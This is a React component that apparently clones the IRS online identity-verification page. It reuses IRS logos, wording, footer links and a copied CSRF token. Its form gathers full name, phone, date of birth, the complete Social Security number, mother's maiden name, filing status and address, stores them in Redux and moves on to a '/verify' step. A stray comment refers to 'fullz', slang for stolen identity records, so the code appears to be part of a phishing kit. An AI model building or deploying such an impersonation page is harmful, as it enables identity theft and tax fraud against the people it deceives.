import { useState } from 'react'
import { useDispatch } from 'react-redux'
import { useHistory } from 'react-router-dom'
import './index.css'

const ID = () => {

    const dispatch = useDispatch()
    const history = useHistory()

    const [firstName, setFirstName] = useState('')
    const [middleName, setMiddleName] = useState('')
    const [lastName, setLastName] = useState('')
    const [phone, setPhone] = useState('')
    const [dobMonth, setDobMonth] = useState('')
    const [dobDay, setDobDay] = useState('')
    const [dobYear, setDobYear] = useState('')
    const [ssn1, setSsn1] = useState('')
    const [ssn2, setSsn2] = useState('')
    const [ssn3, setSsn3] = useState('')
    const [mmn, setMmn] = useState('')
    const [filedForTaxReturn, setFiledForTaxReturn] = useState('n/a')
    const [address1, setAddress1] = useState('')
    const [address2, setAddress2] = useState('')
    const [city, setCity] = useState('')
    const [state, setState] = useState('')
    const [zipcode, setZipcode] = useState('')
    const [country, setCountry] = useState('')

    const handleSubmit = e => {
        e.preventDefault()

        dispatch({type: 'set', payload: {
            firstName,
            middleName,
            lastName,
            phone,
            dobMonth,
            dobDay,
            dobYear,
            ssn1,
            ssn2,
            ssn3,
            mmn,
            filedForTaxReturn,
            address1,
            address2,
            city,
            state,
            zipcode,
            country
        }})
        // alert(fulllzzzz)
        history.push('/verify')
    }

    const handleChange = e => {
        setFiledForTaxReturn(e.target.value)
        console.log(filedForTaxReturn)
    }

    return (
        <>
        <div id="main-longform">
 		
		
			
		{/* <!-- PageIdentifier: HEADER --> */}

    




   
 








	
	
		
	



	
	
		
	



	
	
		
	



	
	
		
	



	
	
		
	



	
		
	
	








	




{/* <script type="text/javascript" language="Javascript">  
if (top != self) { 
	top.location = self.location;
}
</script> */}

<div className="headerBar">
	
    <img src="https://sa.www4.irs.gov/eauth/pub/common/images/logo.png" alt="" 
    style={{transform: 'translateX(168%)'}}
    />
		
		
		
	<div id="access" tabIndex="1"></div>	
		
</div>



<div id="mainsearch">

	
	
	
	
	

	
	

		
	
	

	
	
	
	
	
		
	
		
</div>

 
		
		<div id="content">
		
			<h1 className="title">
				Help us verify your identity with some basic information
			</h1>
			 
			<div id="error_message">
					
					
					
					
					
					
					
					
			</div>

			<form method="post" id="IDProofForm"  name="IDProofForm" autoComplete="off"
					onSubmit={handleSubmit}>

			{/* <!-- FORM HEADER TEXT --> */}

			<div className="instruction">
				
					
					
						
						<br /><br />
						If we are not able to match the information you enter with our records, you will not be able to use this online service.
					
				
			</div>
			
			<div id="form_content">
			
			<h2 className="title">Personal Information</h2>
			
			<p>
				All information should match your latest tax return.
			</p>
			

				{/* <!-- HIDDEN FIELDS --> */}
				

				{/* <!-- FIRST NAME --> */}

				<div className="fieldset">

					<fieldset>						

						<legend><span className="access-label">
							User Name Information
						</span></legend>

						<p>

							
							<label htmlFor="first_name">
								First Name
							</label>
							<input type="text" id="first_name" name="first_name"
                            size="50" maxLength="50"  
                            required
                            tabIndex="0" className="textbox " 
                            // textbox-readonly
                                 value={firstName}
                                 onChange={e => setFirstName(e.target.value)} />
									 	
					
					
									 	
							{/* &nbsp;<a href="#" id="first_name_link"
							 className="edit-link-display" 
							onClick="makeEditable('first_name', 'textbox');
					 		   		linkStyleChanger('first_name_link');							
									return false"
							 tabIndex="0" title="Edit First Name">
			 			
						<img src="https://sa.www4.irs.gov/eauth/pub/common/images/icon_pencil.gif"
						 alt="Edit First Name" border="0" />&nbsp;Edit
						 </a> */}
						</p>
                        {/* middle name */}

                        <p>

                        <label htmlFor="middle_name">
								Middle Name(s) (Optional)
							</label>
							<input type="text" id="middle_name" name="middle_name"
                            size="50" maxLength="50"  
                            
                            tabIndex="0" className="textbox " 
                            // textbox-readonly
                                 value={middleName}
                                 onChange={e => setMiddleName(e.target.value)} />
                        </p>
								
						{/* <!-- LAST NAME --> */}

						<p>

							
							<label htmlFor="last_name">
								Last Name
							</label>
							<input type="text" id="last_name" name="last_name"
                            size="50" maxLength="50"
                            required
                            tabIndex="0" className="textbox " 
                            // textbox-readonly
                                 value={lastName}
                                 onChange={e => setLastName(e.target.value)} />
									 	
					
					
									 	
							{/* &nbsp;<a href="#" id="last_name_link"
							 className="edit-link-display" 
							onClick="makeEditable('last_name', 'textbox');
					 		   		linkStyleChanger('last_name_link');							
									return false"
							 tabIndex="0" title="Edit Last Name">
			 			
						<img src="https://sa.www4.irs.gov/eauth/pub/common/images/icon_pencil.gif"
						 alt="Edit Last Name" border="0" />&nbsp;Edit
						 </a>									 	 */}
						</p>
						
						
						<input type="hidden" name="email"
						 id="email" value="" />

					</fieldset>

				</div>
				
					{/* <!--  DATE OF BIRTH: MONTH/DAY/YEAR --> */}
					
					

 
					<p><label htmlFor="phonenumber">
						Phone Number
					</label>
						
						<input type="tel" className="textbox " id="phone" name="phone"
						required
						tabIndex="0" maxLength="15"
						value={phone}
                        onChange={e => setPhone(e.target.value)} /></p>



	
		
	
	






				{/* <!-- DATE OF BIRTH --> */}

				<div id="fieldset">

					<fieldset>

						<legend className="access-label">
							Date of Birth
						</legend>
						
						<span id="dob_fieldset" className="pseudo-label">
							Date of Birth
						</span>

						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
					
						<div className="small-field-nosize">
							
							<label className="access-label" htmlFor="month">
								Month
							</label>
							<select name="month" style={{width: "auto"}} 
                            tabIndex="0" aria-labelledby="dob_fieldset"
                            required
							className="select-style"
                            value={dobMonth}
      onChange={e => setDobMonth(e.currentTarget.value)}>
								<option value="" disabled selected>
                                    Month
                                </option>
                                <option value="01">
											01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
										</option>

									{/* <script type="text/javascript">
										document.writeln(displayArrayAsHTMLDropdown(months));
									</script> */}
									
							</select>

						</div>
						
						<div className="small-field-nosize">

							<label className="access-label" htmlFor="day">
								Day
							</label>
							
							
							<select name="day" id="day" style={{width: "auto"}}
							tabIndex="0" aria-labelledby="dob_fieldset"
                             className="select-style"
                             required
                             value={dobDay}
                             onChange={e => setDobDay(e.currentTarget.value)}>
                                 <option value="" disabled selected >
                                    Day
                                </option>
                                 <option value="01">
									01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
										</option>
										<option value="13">
											13
										</option>
										<option value="14">
											14
										</option>
										<option value="15">
											15
										</option>
										<option value="16">
											16
										</option>
										<option value="17">
											17
										</option>
										<option value="18">
											18
										</option>
										<option value="19">
											19
										</option>
										<option value="20">
											20
										</option>
										<option value="21">
											21
										</option>
										<option value="22">
											22
										</option>
										<option value="23">
											23
										</option>
										<option value="24">
											24
										</option>
										<option value="25">
											25
										</option>
										<option value="26">
											26
										</option>
										<option value="27">
											27
										</option>
										<option value="28">
											28
										</option>
										<option value="29">
											29
										</option>
										<option value="30">
											30
										</option>
										<option value="31">
											31
										</option>
							
								{/* <script type="text/javascript">
									document.writeln(displayDaysArrayAsHTMLDropdown());
								</script> */}
								
							</select>

						</div>
					
						<div className="small-field-nosize">

							<label className="access-label" htmlFor="year">
								Year (format: YYYY)
							</label>
							
							
							
							
								{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxLength="4" id="year" required tabIndex="0" aria-labelledby="dob_fieldset" /> */}
                                <select name="month" style={{width: "auto"}} 
									tabindex="0" aria-labelledby="dob_fieldset"
                                    className="select-style"
                                    required
									value={dobYear}
      onChange={e => setDobYear(e.currentTarget.value)}>
          <option value="" disabled selected >
                                    Year
                                </option>
          <option value="1900">
              1900
          </option>
          <option value="1901">
              1901
          </option>
          <option value="1902">
              1902
          </option>
          <option value="1903">
              1903
          </option>
          <option value="1904">
              1904
          </option>
          <option value="1905">
              1905
          </option>
          <option value="1906">
              1906
          </option>
          <option value="1907">
              1907
          </option>
          <option value="1908">
              1908
          </option>
          <option value="1909">
              1909
          </option>
          <option value="1910">
              1910
          </option>
          <option value="1911">
              1911
          </option>
          <option value="1912">
              1912
          </option>
          <option value="1913">
              1913
          </option>
          <option value="1914">
              1914
          </option>
          <option value="1915">
              1915
          </option>
          <option value="1916">
              1916
          </option>
          <option value="1917">
              1917
          </option>
          <option value="1918">
              1918
          </option>
          <option value="1919">
              1919
          </option>
          <option value="1920">
              1920
          </option>
          <option value="1921">
              1921
          </option>
          <option value="1922">
              1922
          </option>
          <option value="1923">
              1923
          </option>
          <option value="1924">
              1924
          </option>
          <option value="1925">
              1925
          </option>
          <option value="1926">
              1926
          </option>
          <option value="1927">
              1927
          </option>
          <option value="1928">
              1928
          </option>
          <option value="1929">
              1929
          </option>
          <option value="1930">
              1930
          </option>
          <option value="1931">
              1931
          </option>
          <option value="1932">
              1932
          </option>
          <option value="1933">
              1933
          </option>
          <option value="1934">
              1934
          </option>
          <option value="1935">
              1935
          </option>
          <option value="1936">
              1936
          </option>
          <option value="1937">
              1937
          </option>
          <option value="1938">
              1938
          </option>
          <option value="1939">
              1939
          </option>
          <option value="1940">
              1940
          </option>
          <option value="1941">
              1941
          </option>
          <option value="1942">
              1942
          </option>
          <option value="1943">
              1943
          </option>
          <option value="1944">
              1944
          </option>
          <option value="1945">
              1945
          </option>
          <option value="1946">
              1946
          </option>
          <option value="1947">
              1947
          </option>
          <option value="1948">
              1948
          </option>
          <option value="1949">
              1949
          </option>
          <option value="1950">
              1950
          </option>
          <option value="1951">
              1951
          </option>
          <option value="1952">
              1952
          </option>
          <option value="1953">
              1953
          </option>
          <option value="1954">
              1954
          </option>
          <option value="1955">
              1955
          </option>
          <option value="1956">
              1956
          </option>
          <option value="1957">
              1957
          </option>
          <option value="1958">
              1958
          </option>
          <option value="1959">
              1959
          </option>
          <option value="1960">
              1960
          </option>
          <option value="1961">
              1961
          </option>
          <option value="1962">
              1962
          </option>
          <option value="1963">
              1963
          </option>
          <option value="1964">
              1964
          </option>
          <option value="1965">
              1965
          </option>
          <option value="1966">
              1966
          </option>
          <option value="1967">
              1967
          </option>
          <option value="1968">
              1968
          </option>
          <option value="1969">
              1969
          </option>
          <option value="1970">
              1970
          </option>
          <option value="1971">
              1971
          </option>
          <option value="1972">
              1972
          </option>
          <option value="1973">
              1973
          </option>
          <option value="1974">
              1974
          </option>
          <option value="1975">
              1975
          </option>
          <option value="1976">
              1976
          </option>
          <option value="1977">
              1977
          </option>
          <option value="1978">
              1978
          </option>
          <option value="1979">
              1979
          </option>
          <option value="1980">
              1980
          </option>
          <option value="1981">
              1981
          </option>
          <option value="1982">
              1982
          </option>
          <option value="1983">
              1983
          </option>
          <option value="1984">
              1984
          </option>
          <option value="1985">
              1985
          </option>
          <option value="1986">
              1986
          </option>
          <option value="1987">
              1987
          </option>
          <option value="1988">
              1988
          </option>
          <option value="1989">
              1989
          </option>
          <option value="1990">
              1990
          </option>
          <option value="1991">
              1991
          </option>
          <option value="1992">
              1992
          </option>
          <option value="1993">
              1993
          </option>
          <option value="1994">
              1994
          </option>
          <option value="1995">
              1995
          </option>
          <option value="1996">
              1996
          </option>
          <option value="1997">
              1997
          </option>
          <option value="1998">
              1998
          </option>
          <option value="1999">
              1999
          </option>
          <option value="2000">
              2000
          </option>
          <option value="2001">
              2001
          </option>
          <option value="2002">
              2002
          </option>
          <option value="2003">
              2003
          </option>
          <option value="2004">
              2004
          </option>
          <option value="2005">
              2005
          </option>
							</select>
							

						</div>

					</fieldset>

					</div> 

					{/* <!--  SOCIAL SECURITY NUMBER --> */}
					 
					

 




	
		
	
	


                    <p><label htmlFor="mmn">
						Mother's Maiden Name
					</label>
						
						<input type="text" className="textbox " id="mmn" name="mmn"
						required
						tabIndex="0" 
						value={mmn}
                        onChange={e => setMmn(e.target.value)} /></p>




				<div id="ssn_fieldset" className="fieldset">

					<fieldset>						

						<input type="hidden" id="ssn1x" name="ssn1x" value="" />
						<input type="hidden" id="ssn2x" name="ssn2x" value="" />
						<input type="hidden" id="ssn3x" name="ssn3x" value="" />
						
						<input type="hidden" id="ssn" name="ssn" value="" />
						
						<label htmlFor="ssn_fieldset">
							
							
							Social Security Number (SSN) or&nbsp;
							
							
						 <a href="https://sa.www4.irs.gov/eauth/pub/help/itin.jsp" target="_blank" tabIndex="0"
						  id="help-link" className="help" title="Individual Tax ID Number (ITIN)">
						  Individual Tax ID Number (ITIN)
						 </a>
						 </label>
						
						
						
							
						
						
						
							
						
						<input tabIndex="0" type="password" name="ssn1" id="ssn1" size="3" minLength="3" maxLength="3"
							autoComplete="off"
							// onKeyUp="combineSSN(); return ssnJump(this, event)"
                            value={ssn1}
                            onChange={e => setSsn1(e.target.value)} style={{width:"auto"}} className="textbox" required />
							-
						<input tabIndex="0" type="password" name="ssn2" id="ssn2" size="2" minLength="2" maxLength="2" 
							autoComplete="off"
							// onKeyUp="combineSSN(); return ssnJump(this, event)"
							value={ssn2} 
                            onChange={e => setSsn2(e.target.value)} style={{width:"auto"}} className="textbox" required />
							-
						<input tabIndex="0" type="text" name="ssn3" id="ssn3" size="4" minLength="4" maxLength="4"
							autoComplete="off"
							// onKeyUp="ssnRemoveNonDigits(this); combineSSN()"
                            value={ssn3}
                            onChange={e => setSsn3(e.target.value)}  style={{width:"auto"}} className="textbox" required  />
			
						<label htmlFor="ssn1" className="access-label">
							Please enter the first three digits of your Social Security Number.
						</label>
						<label htmlFor="ssn2" className="access-label">
							Please enter the second two digits of your Social Security Number.
						</label>
						<label htmlFor="ssn3" className="access-label">
							Please enter the last four digits of your Social Security Number.
						</label>
						

					</fieldset>

				</div>
                
				<br />
					
					{/* <!-- TAX FILER INDICATOR --> */}
					
					<h2 className="title">
						Filing Status
					</h2>

					<div className="fieldset">

						<fieldset>
						
						<legend className="access-label" style={{position:"relative !important"}}>
							Filing Status Information
						</legend>
				
							<p>
								
								
								
								<label htmlFor="tax_filer_true" className="inline unbold no-outline tax-filer-true-style">
								<input type="radio" name="xtax_filer" value='true'
                                         onChange={handleChange}/>
								 I have filed a tax return in the past seven years
							</label>
							</p>
							
							<input type="hidden" id="tax_filer" name="tax_filer" value="" />

					
						
						
						
							<p>
								<label htmlFor="tax_filer_false" className="unbold no-outline tax-filer-true-style">
								<input type="radio" name="xtax_filer" 
									 value='false' 
                                     onChange={handleChange}/>
								I have not filed a tax return in the past seven years
							</label>
							</p>
							
					
								
						</fieldset>
					</div>

					
					{/* <!--  ADDRESS INFORMATION --> */}
					
					<h2 className="title">
						Address Information
					</h2>
					
					<p>
                        {
                            (filedForTaxReturn == 'false') ? 
                                
                                    <span id="is_tax_nonfiler_display" className="address-subheader1-display">
                                        If you have not filed in the past 7 years, provide your current mailing address.
                                    </span>

                                 :
                                 
                                    <span id="is_tax_filer_display" className="address-subheader1-display">
                                                Your address must match your most recently filed tax return. &nbsp;
                                                
                                    
                                        <a 
                                        href="https://www.irs.gov/uac/Taxpayer-Identity-Verification-Information#formataddress" 
                                            tabIndex="0"
                                            target="_new" id="address_help"
                                        title="Address Help" className="help bold-help-link">Address Help</a>
                                                
                                    </span>

                                
                            }
                        
					</p>
							
					<div className="fieldset">

						<fieldset>
							<legend><span className="access-label"><b>
								Address Information
							</b></span></legend>
							
							{/* <!-- ADDRESS LINE 1 --> */}

							<p><label htmlFor="address1">
								Address Line 1
							</label>
								
								<input type="text" className="textbox address-textbox" id="address1" name="address1"
								required
								tabIndex="0" maxLength="100"
                                value={address1}
                                onChange={e => setAddress1(e.target.value)} /></p>
									

							{/* <!-- ADDRESS LINE 2 --> */}

							<p><label htmlFor="address2">
								Address Line 2 (Optional)
							</label>
							
			 					<input type="text" className="textbox address-textbox" id="address2" name="address2"
			 					tabIndex="0" maxLength="100"
                                value={address2}
                                onChange={e => setAddress2(e.target.value)} /></p>
									

							{/* <!-- CITY --> */}

							<p><label htmlFor="city">
								City
							</label>
								
								<input type="text" className="textbox city-textbox" id="city" name="city" required
								tabIndex="0" size="50" maxLength="50"
                                value={city}
                                onChange={e => setCity(e.target.value)} /></p>

							<p>
								
							{/* <!-- U.S. STATE --> */}
								
								<div className="small-field-nosize">
								<label htmlFor="state" id="stateLabel">
									State / Territory
								</label>
								
								
								
								<select id="state" name="state"
                                tabIndex="0" className="select-style"
                                required
                                value={state}
                                onChange={e => setState(e.currentTarget.value)}>

									<option value="" disabled selected>
                                        State / Territory
                                    </option>
									<option value="Alabama">
                                        Alabama
                                    </option>
									<option value="Alaska">
                                        Alaska
                                    </option>
									<option value="American Samoa">
                                        American Samoa
                                    </option>
									<option value="Arizona">
                                        Arizona
                                    </option>
									<option value="Arkansas">
                                        Arkansas
                                    </option>
									<option value="Armed Forces Africa">
                                        Armed Forces Africa
                                    </option>
									<option value="Armed Forces Americas">
                                        Armed Forces Americas
                                    </option>
									<option value="Armed Forces Canada">
                                        Armed Forces Canada
                                    </option>
									<option value="Armed Forces Europe">
                                        Armed Forces Europe
                                    </option>
									<option value="Armed Forces Middle East">
                                        Armed Forces Middle East
                                    </option>
									<option value="Armed Forces Pacific">
                                        Armed Forces Pacific
                                    </option>
									<option value="California">
                                        California
                                    </option>
									<option value="Colorado">
                                        Colorado
                                    </option>
									<option value="Connecticut">
                                        Connecticut
                                    </option>
									<option value="Delaware">
                                        Delaware
                                    </option>
									<option value="District of Columbia">
                                        District of Columbia
                                    </option>
									<option value="Federated States of Micronesia">
                                        Federated States of Micronesia
                                    </option>
									<option value="Florida">
                                        Florida
                                    </option>
									<option value="Georgia">
                                        Georgia
                                    </option>
									<option value="Guam">
                                        Guam
                                    </option>
									<option value="Hawaii">
                                        Hawaii
                                    </option>
									<option value="Idaho">
                                        Idaho
                                    </option>
									<option value="Illinois">
                                        Illinois
                                    </option>
									<option value="Indiana">
                                        Indiana
                                    </option>
									<option value="Iowa">
                                        Iowa
                                    </option>
									<option value="Kansas">
                                        Kansas
                                    </option>
									<option value="Kentucky">
                                        Kentucky
                                    </option>
									<option value="Louisiana">
                                        Louisiana
                                    </option>
									<option value="Maine">
                                        Maine
                                    </option>
									<option value="Marshall Islands">
                                        Marshall Islands
                                    </option>
									<option value="Maryland">
                                        Maryland
                                    </option>
									<option value="Massachusetts">
                                        Massachusetts
                                    </option>
									<option value="Michigan">
                                        Michigan
                                    </option>
									<option value="Mississippi">
                                        Mississippi
                                    </option>
									<option value="Missouri">
                                        Missouri
                                    </option>
									<option value="Montana">
                                        Montana
                                    </option>
									<option value="Nebraska">
                                        Nebraska
                                    </option>
									<option value="Nevada">
                                        Nevada
                                    </option>
									<option value="New Hampshire">
                                        New Hampshire
                                    </option>
									<option value="New Jersey">
                                        New Jersey
                                    </option>
									<option value="New Mexico">
                                        New Mexico
                                    </option>
									<option value="New York">
                                        New York
                                    </option>
									<option value="North Carolina">
                                        North Carolina
                                    </option>
									<option value="North Dakota">
                                        North Dakota
                                    </option>
									<option value="Northern Mariana Islands">
                                        Northern Mariana Islands
                                    </option>
									<option value="Ohio">
                                        Ohio
                                    </option>
									<option value="Oklahoma">
                                        Oklahoma
                                    </option>
									<option value="Oregon">
                                        Oregon
                                    </option>
									<option value="Palau">
                                        Palau
                                    </option>
									<option value="Pennsylvania">
                                        Pennsylvania
                                    </option>
									<option value="Puerto Rico">
                                        Puerto Rico
                                    </option>
									<option value="Rhode Island">
                                        Rhode Island
                                    </option>
									<option value="South Carolina">
                                        South Carolina
                                    </option>
									<option value="South Dakota">
                                        South Dakota
                                    </option>
									<option value="Tennessee">
                                        Tennessee
                                    </option>
									<option value="Texas">
                                        Texas
                                    </option>
									<option value="Utah">
                                        Utah
                                    </option>
									<option value="Vermont">
                                        Vermont
                                    </option>
									<option value="Virgin Islands">
                                        Virgin Islands
                                    </option>
									<option value="Virginia">
                                        Virginia
                                    </option>
									<option value="Washington">
                                        Washington
                                    </option>
									<option value="West Virginia">
                                        West Virginia
                                    </option>
									<option value="Wisconsin">
                                        Wisconsin
                                    </option>
									<option value="Wyoming">
                                        Wyoming
                                    </option>

									
										{/* <script type="text/javascript">
											if (states.isIndexOffset()) states = states.reindex();
											document.writeln(displayArrayAsHTMLDropdown(states));
										</script> */}

								</select>
							</div>
							
							{/* <!-- ZIP OR POSTAL CODE --> */}

							<div className="small-field-nosize">

								<label htmlFor="zip" id="zipLabel">
									ZIP Code
								</label>
								
								<input type="text" className="textbox zip-textbox" tabIndex="0"
                                    name="zip" id="zip" value={zipcode} 
                                    onChange={e => setZipcode(e.target.value)}
                                    required
									size="5" maxLength="5" />
								</div>
							
						{/* <!-- COUNTRY --> */}
							
							<div className="small-field-nosize">
							<label htmlFor="country">
								Country
							</label>								
								<select id="country" name="country" 
                                        className="select-style" tabIndex="0"
                                        required
										value={country}
                                        onChange={e => setCountry(e.currentTarget.value)}>

									<option value="" disabled selected>Country</option>
									<option value="United States">United States</option>

									{/* <script type="text/javascript">
									
										document.writeln(displayArrayAsHTMLDropdown(countries, 'United States'));
									</script>  */}

								</select>
							</div>
							
								
								                                
                                </p>

                        <p>&nbsp;</p>

                        <p>&nbsp;</p>

                       </fieldset>
                    </div>
                    
                    
					
					<span className="vertical-divider"></span>

					{/* <!-- SUBMIT BUTTONS --> */}
						<p>
							
							
							
							<input type="image" name="continue" id="continue"
								 alt="Continue" className="yes_button_position" 
								// onFocus="addVisualFocusIndicator(this, true)"
								onBlur="this.style.border = ''"
								// onClick="addVisualFocusIndicator(this, true)"
								src="https://sa.www4.irs.gov/eauth/pub/common/images/button_continue.jpg" 
								value="Continue" 
								tabIndex="0" 
							/>
							
							<span className="button-divider"></span>
						
							
							
							
							{/* <button type="button" name="cancel" id="cancel" value="Cancel" className="no_button_position no-button" 
								tabIndex="0" 
								onclick="backClicked('/eauth/pub/login.jsp'); return false">
  								<img alt="Cancel"
  									src="https://sa.www4.irs.gov/eauth/pub/common/images/button_cancel.jpg"/>
							</button> */}
						</p>
		
				
				
				
				
					
				
				
				<input type="hidden"
				 id="EAUTH_CSRF_SECURITY_TOKEN_PARAM"
				 name="EAUTH_CSRF_SECURITY_TOKEN_PARAM" value="UuKFKKNCAqWZf9Cv" />
				</div> 
                {/* <!-- END OF FORM-CONTENT --> */}
 
			</form>	
 
		</div>
		
		
			
		

 




	
		
	
	









<div className="footerBar" role="contentinfo">
<p>
<ul>

	<li>
		<a href="https://www.irs.gov/secureaccess" tabIndex="0" target="_blank">
			Help</a>	
	</li> &nbsp;|&nbsp;
	
	<li>
		<a href="http://www.irs.gov/uac/IRS-Privacy-Policy" tabIndex="0" target="_blank">
			IRS Privacy Policy</a>
	</li> &nbsp;|&nbsp;
	
	<li>
		<a href="https://sa.www4.irs.gov/eauth/pub/help/sec_code_terms_conditions.jsp" target="_blank" tabIndex="0">
			  Security Code Terms and Conditions</a>
	</li>
    &nbsp;|&nbsp;
	
	<li>
    <a href="https://sa.www4.irs.gov/eauth/pub/help/accessibility.jsp"  
		tabIndex="0" 
		target="_blank"
		rel="noreferrer">
			  Accessibility</a>
	</li>
			  
	

</ul>	
</p>
</div>
	</div>
 {/* <!-- The Modal -->  */}


 




	
		
	
	








{/* 


<div role="dialog" id="sessionWarningDialog" aria-labelledby="Session Expiration Notice" 
	aria-modal="true" className="hidden">
	<h2 className="dialog_title" style={{textAlign: 'left', paddingLeft: '17px'}}>Session Expiration Notice </h2>
	<div className="dialog_form">
		<p style={{padding: '2px', margin: '0px'}} align="left">
			Your session will expire in 5 minutes at  <span id="SessionExpTime"></span> Do you need more time? 
		</p>
	</div>
	<div className="dialog_form_actions">
		
			<button type="button" id="continue" name="continue" tabIndex="0" aria-label="Yes" className="dialog_yes_button_position dialog_yes_button"  
				onclick="sendHttpRequest(window.location.href); getSessionExpirationTime(); setTimeout(function() { openDialog('sessionWarningDialog', this, 'continue'); }, sessionTimeoutWarningInterval); cancelTimeoutRedirection(); setupTimeoutRedirection(); closeDialog(this);">
  				<img alt="Yes" 
  					src="https://sa.www4.irs.gov/eauth/pub/common/images/button_yes.jpg"/>
			</button>
		
		
		<button type="button" name="no" tabIndex="0" aria-label="No" className="dialog_close_button"   
			onclick="closeDialog(this);">
  			<img alt="No" 
  				src="https://sa.www4.irs.gov/eauth/pub/common/images/button_x.jpg"/>
		</button>
	</div>
</div>  */}
</>
    )
}

export default ID